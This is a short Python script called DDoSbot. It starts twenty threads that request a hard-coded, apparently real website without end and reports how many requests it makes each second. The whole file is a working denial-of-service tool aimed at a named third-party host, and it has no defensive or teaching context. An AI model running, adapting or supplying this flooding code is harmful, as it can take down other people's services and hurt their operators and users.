from urllib import request as ur
import threading
import time

class DDoSbot:
    def __init__(self,url):
        self.url = url
        self.reqsmade = 0
        self.threads = []

    def start_ddos(self,i):
        print('Thread %d started.' % i)
        while True:
            response = ur.urlopen(self.url)
            self.reqsmade += 1

    def count_reqs(self):
        while True:
            print('%d requests made in the last second.' % self.reqsmade)
            self.reqsmade = 0
            time.sleep(1)

    def start(self):
        self.count_thread = threading.Thread(target=self.count_reqs)
        self.count_thread.start()
        i = 0
        while True:
            thread = threading.Thread(target=self.start_ddos,args=(i,))
            self.threads.append(thread)
            thread.start()
            i += 1
            time.sleep(1)
            if i == 20:
                break

walle = DDoSbot('http://snapreview.conorstuartroe.com')
walle.start()
        
